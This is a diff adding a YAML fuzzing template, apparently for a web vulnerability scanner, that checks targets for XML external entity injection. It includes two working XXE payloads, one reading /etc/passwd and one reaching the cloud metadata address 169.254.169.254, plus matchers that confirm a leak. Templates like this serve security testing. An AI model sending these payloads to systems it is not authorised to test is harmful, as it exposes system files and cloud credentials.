@@ -1,0 +1,28 @@
+id: xxe-basic
+name: XXE Injection
+severity: critical
+type: fuzz
+
+requests:
+  - method: POST
+    targets: [body]
+    content_type: "application/xml"
+    fuzzing:
+      - mode: replace
+        payloads:
+          - |
+            <?xml version="1.0"?>
+            <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+            <foo>&xxe;</foo>
+          - |
+            <?xml version="1.0"?>
+            <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+            <foo>&xxe;</foo>
+
+matchers:
+  - type: regex
+    part: body
+    words:
+      - "root:.*:0:0:"
+      - "\\[EC2[_-]"
+      - "ami-id"
